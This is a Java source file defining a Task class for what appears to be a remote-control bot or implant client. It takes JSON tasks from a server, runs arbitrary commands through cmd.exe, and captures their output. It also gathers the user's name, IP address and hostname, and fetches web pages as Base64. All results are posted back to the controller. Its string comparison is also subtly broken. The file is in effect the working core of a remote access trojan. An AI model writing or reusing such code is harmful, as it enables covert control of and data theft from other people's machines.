package pl.kkogut;

import org.json.JSONObject;
import com.google.gson.Gson;

import java.io.*;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.util.UUID;
import java.util.Base64;


public class Task {
    String ID = null;
    TaskType type;
    String cmd; //command
    String response;
    boolean proceeded;
    enum TaskType{HELLO, VIEW_SITE, CMD_RUN};

    public Task(String jsonString){
        JSONObject json = new JSONObject(jsonString);
        Task task = new Gson().fromJson(json.toString(), Task.class);
        this.ID = task.ID;
        this.type = task.type;
        this.cmd = task.cmd;
        this.response = task.response;
        this.proceeded = task.proceeded;
    }
    public Task (TaskType type, String cmd){
        this.ID = UUID.randomUUID().toString(); // only with sending to do
        this.type = type;
        this.cmd = cmd;
    }

    public void sendToDo(){
        APIcaller.post(this.toJson());
    }

    public boolean proceed(){

            if (type == TaskType.VIEW_SITE) {
                getWebPage(cmd);
            }
            else if(type == TaskType.HELLO){
                if(cmd =="How are you?"){
                    response = sayHello();
                }

            }
            else if(type==TaskType.CMD_RUN){
                response = runCmd();
            }
            else {
                response = "nothing done";
            }
            proceeded = true;
            sendResponse();
            return true;
        }

    private String runCmd() {
        try {
            StringBuilder stringBuilder = new StringBuilder();
            ProcessBuilder builder = new ProcessBuilder(
                    "cmd.exe", "/c", cmd);
            builder.redirectErrorStream(true);
            Process p = builder.start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while (true) {
                line = r.readLine();
                if (line == null) { break; }
                stringBuilder.append(line);
            }
            return stringBuilder.toString();
        } catch (IOException ioException) {
            ioException.printStackTrace();
        }
        return null;
    }


    private String sayHello()  {
        try {
            InetAddress inetAddress = InetAddress.getLocalHost();
            String userName = new com.sun.security.auth.module.NTSystem().getName();
            String IP = inetAddress.getHostAddress();
            String host = inetAddress.getHostName();
            return String.format("I am fine! %s send kisses from IP %s and device %s", userName, IP, host);
        }catch (UnknownHostException uhe){
            System.out.println("I am not feeling well! I don't know where am I...");
        }
        return "Nothing to say to You!";
        }

    void sendResponse(){
        APIcaller.post(this.toJson());
    }
    File getWebPage(String websiteAddress){
        try {
            URL url = new URL(websiteAddress);
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            File file = FilesOperator.saveFile(reader, "website.html");

            byte[] fileBytes = Files.readAllBytes(file.toPath());
            response = Base64.getEncoder().encodeToString(fileBytes);
            return file;
        }
        catch (MalformedURLException mue) {
            System.out.println("Malformed URL Exception raised");
        }
        catch (IOException ie) {
            System.out.println("IOException raised");
        }

        return null;
    }
    JSONObject toJson(){
        String jsonStr = new Gson().toJson(this, Task.class);
        JSONObject json = new JSONObject(jsonStr);
        return json;
    }
}
